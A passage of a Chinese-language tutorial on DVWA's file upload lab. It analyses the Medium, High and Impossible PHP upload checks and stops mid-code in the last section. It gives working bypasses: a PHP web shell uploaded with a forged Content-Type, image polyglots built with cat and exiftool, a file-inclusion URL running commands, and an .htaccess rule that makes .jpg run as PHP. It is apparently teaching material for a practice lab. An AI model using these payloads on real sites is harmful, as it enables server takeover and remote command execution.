+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了客户端和MIME类型检查，但可以绕过。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：获取上传文件信息 ★★★</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];  <span class="comment">// MIME类型（客户端提供）</span></span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：检查文件大小 ★★★</span></span><br><span class="line">    <span class="comment">// 限制文件大小为100KB</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 核心防护：检查MIME类型 ★★★</span></span><br><span class="line">        <span class="comment">// 只允许以下MIME类型：</span></span><br><span class="line">        <span class="comment">// image/jpeg - JPEG图片</span></span><br><span class="line">        <span class="comment">// image/png  - PNG图片</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 问题：MIME类型是客户端提供的，可以伪造！</span></span><br><span class="line">        <span class="comment">// $_FILES[&#x27;uploaded&#x27;][&#x27;type&#x27;] 来自HTTP请求头 Content-Type</span></span><br><span class="line">        <span class="comment">// 攻击者可以修改Content-Type欺骗服务器</span></span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 验证通过，上传文件</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 验证失败</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>文件大小检查</strong> - 限制100KB</li>
+<li><strong>MIME类型检查</strong> - 只允许image&#x2F;jpeg和image&#x2F;png</li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：</strong></p>
+<p>MIME类型（Content-Type）是客户端提供的，完全不可信！</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundary</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg  ← 这里可以随意修改！</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary--</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：使用Burp-Suite修改Content-Type"><a href="#方法1：使用Burp-Suite修改Content-Type" class="headerlink" title="方法1：使用Burp Suite修改Content-Type"></a>方法1：使用Burp Suite修改Content-Type</h4><p><strong>步骤：</strong></p>
+<ol>
+<li>准备shell.php文件</li>
+<li>开启Burp Suite代理</li>
+<li>在DVWA上传shell.php</li>
+<li>Burp拦截请求</li>
+<li>修改Content-Type</li>
+</ol>
+<p><strong>原始请求：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dvwa/vulnerabilities/upload/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundary</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/x-php</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary--</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>修改后：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dvwa/vulnerabilities/upload/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">...</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundary</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/jpeg  ← 修改这里</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundary--</span></span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>Forward请求</li>
+<li>上传成功！</li>
+<li>访问shell.php执行命令</li>
+</ol>
+<h4 id="方法2：使用文件头欺骗（图片马）"><a href="#方法2：使用文件头欺骗（图片马）" class="headerlink" title="方法2：使用文件头欺骗（图片马）"></a>方法2：使用文件头欺骗（图片马）</h4><p>创建包含PHP代码的图片文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：在图片末尾添加PHP代码</span></span><br><span class="line"><span class="built_in">cat</span> image.jpg shell.php &gt; shell.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：使用exiftool添加</span></span><br><span class="line">exiftool -Comment=<span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> image.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：直接编辑</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;\xFF\xD8\xFF\xE0&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p>然后：</p>
+<ol>
+<li>上传shell.jpg</li>
+<li>结合文件包含漏洞访问</li>
+</ol>
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>检查文件扩展名和图片尺寸，更难绕过。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：检查文件扩展名 ★★★</span></span><br><span class="line">    <span class="comment">// strtolower() - 转换为小写</span></span><br><span class="line">    <span class="comment">// pathinfo() - 返回文件路径的信息</span></span><br><span class="line">    <span class="comment">// PATHINFO_EXTENSION - 获取文件扩展名</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 例如：</span></span><br><span class="line">    <span class="comment">// shell.php → php</span></span><br><span class="line">    <span class="comment">// image.JPG → jpg（转小写）</span></span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">strtolower</span>( <span class="title function_ invoke__">pathinfo</span>( <span class="variable">$uploaded_name</span>, PATHINFO_EXTENSION ) );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护1：扩展名白名单 ★★★</span></span><br><span class="line">    <span class="comment">// 只允许jpg和jpeg扩展名</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpeg&quot;</span> ) &amp;&amp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 核心防护2：检查文件大小 ★★★</span></span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 核心防护3：使用getimagesize()验证 ★★★</span></span><br><span class="line">        <span class="comment">// getimagesize() - 获取图像尺寸和类型</span></span><br><span class="line">        <span class="comment">// 参数：图片文件路径</span></span><br><span class="line">        <span class="comment">// 返回值：</span></span><br><span class="line">        <span class="comment">//   成功：数组 [0=&gt;width, 1=&gt;height, 2=&gt;type, ...]</span></span><br><span class="line">        <span class="comment">//   失败：false</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 作用：</span></span><br><span class="line">        <span class="comment">// 1. 验证文件是否为有效图片</span></span><br><span class="line">        <span class="comment">// 2. 读取图片的实际内容（不是文件名或MIME类型）</span></span><br><span class="line">        <span class="comment">// 3. 如果不是图片，返回false</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 这是一个强大的防护，因为它检查文件实际内容</span></span><br><span class="line">        <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 所有验证通过</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>扩展名白名单</strong> - 只允许.jpg和.jpeg</li>
+<li><strong>文件大小限制</strong> - 100KB</li>
+<li><strong>getimagesize()验证</strong> - 检查文件是否为真实图片</li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p>虽然防护很强，但仍有绕过方法：</p>
+<p><strong>关键点：</strong></p>
+<ul>
+<li><code>getimagesize()</code>只验证文件是否为图片</li>
+<li>不阻止图片中包含PHP代码</li>
+<li>可以创建图片马（图片+PHP代码）</li>
+</ul>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：创建图片马"><a href="#方法1：创建图片马" class="headerlink" title="方法1：创建图片马"></a>方法1：创建图片马</h4><p><strong>步骤1：准备合法图片</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载或创建一个jpg图片</span></span><br><span class="line">wget http://example.com/image.jpg</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤2：在图片中嵌入PHP代码</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法1：在图片末尾添加PHP代码</span></span><br><span class="line"><span class="built_in">cat</span> image.jpg &gt; shell.jpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt;&gt; shell.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法2：使用exiftool</span></span><br><span class="line">exiftool -Comment=<span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> image.jpg -o shell.jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方法3：使用十六进制编辑器</span></span><br><span class="line"><span class="comment"># 在图片文件末尾手动添加PHP代码</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤3：上传图片马</strong></p>
+<ol>
+<li>上传shell.jpg</li>
+<li>getimagesize()验证：通过（因为前面是合法图片）</li>
+<li>扩展名检查：通过（.jpg）</li>
+<li>上传成功！</li>
+</ol>
+<p><strong>步骤4：利用文件包含漏洞执行</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要结合文件包含漏洞</span></span><br><span class="line">http:<span class="regexp">//</span>dvwa.local<span class="regexp">/dvwa/</span>vulnerabilities<span class="regexp">/fi/</span>?page=..<span class="regexp">/../</span>hackable<span class="regexp">/uploads/</span>shell.jpg&amp;cmd=whoami</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或使用.htaccess（如果可以上传）</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：上传-htaccess"><a href="#方法2：上传-htaccess" class="headerlink" title="方法2：上传.htaccess"></a>方法2：上传.htaccess</h4><p>如果可以上传任意文件名（只检查扩展名），尝试上传.htaccess：</p>
+<p><strong>.htaccess内容：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将.jpg文件当作PHP执行</span></span><br><span class="line"><span class="attribute">AddType</span> application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击流程：</strong></p>
+<ol>
+<li>上传.htaccess（需要绕过扩展名检查）</li>
+<li>上传包含PHP代码的shell.jpg</li>
+<li>访问shell.jpg，Apache会将其作为PHP执行</li>
+</ol>
+<h4 id="方法3：双扩展名"><a href="#方法3：双扩展名" class="headerlink" title="方法3：双扩展名"></a>方法3：双扩展名</h4><p>某些配置下：</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.jpg  <span class="comment"># 可能被当作PHP执行</span></span><br><span class="line"><span class="built_in">shell</span>.jpg.php  <span class="comment"># 可能绕过检查</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的验证机制，真正安全。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：验证Anti-CSRF token ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：重命名文件（使用MD5） ★★★</span></span><br><span class="line">    <span class="comment">// md5() - 计算字符串的MD5哈希</span></span><br><span class="line">    <span class="comment">// uniqid() - 生成唯一ID</span></span><br><span class="line">    <span class="comment">// time() - 当前时间戳</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 组合生成唯一文件名，防止：</span></span><br><span class="line">    <span class="comment">// 1. 覆盖已有文件</span></span><br><span class="line">    <span class="comment">// 2. 猜测文件名</span></span><br><span class="line">    <span class="comment">// 3. 路径遍历</span></span><br><span class="line">    <span class="variable">$target_file</span> =  <span class="title function_ invoke__">md5</span>( <span class="title function_ invoke__">uniqid</span>() . <span class="title function_ invoke__">time</span>() ) . <span class="string">&#x27;.&#x27;</span> . <span class="title function_ invoke__">strtolower</span>( <span class="title function_ invoke__">pathinfo</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ], PATHINFO_EXTENSION ) );</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="variable">$target_file</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">strtolower</span>( <span class="title function_ invoke__">pathinfo</span>( <span class="variable">$uploaded_name</span>, PATHINFO_EXTENSION ) );</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 验证1：扩展名白名单 ★★★</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_ext</span> == <span class="string">&#x27;jpg&#x27;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&#x27;jpeg&#x27;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 验证2：文件大小 ★★★</span></span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 验证3：getimagesize()验证 ★★★</span></span><br><span class="line">        <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 改进3：使用imagecreatefromjpeg()重新生成图片 ★★★</span></span><br><span class="line">        <span class="comment">// imagecreatefromjpeg() - 从JPEG文件创建图像</span></span><br><span class="line">        <span class="comment">// 作用：</span></span><br><span class="line">        <span class="comment">// 1. 重新渲染图片</span></span><br><span class="line">        <span class="comment">// 2. 移除图片中的PHP代码</span></span><br><span class="line">        <span class="comment">// 3. 只保留图片数据</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// 原理：</span></span><br><span class="line">        <span class="comment">// PHP的GD库会重新渲染图片</span></span><br><span class="line">        <span class="comment">// 只保留图像数据，丢弃其他内容（包括恶意代码）</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_ext</span> == <span class="string">&#x27;jpg&#x27;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&#x27;jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span 